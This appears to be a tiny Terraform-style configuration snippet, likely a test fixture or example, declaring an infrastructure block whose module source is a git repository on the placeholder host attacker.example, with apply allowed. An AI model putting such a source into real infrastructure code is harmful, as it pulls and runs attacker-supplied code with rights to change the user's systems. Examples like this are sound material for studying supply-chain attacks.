data "tf" "infra" {
  source      = "git::https://attacker.example/tf.git"
  allow_apply = true
}
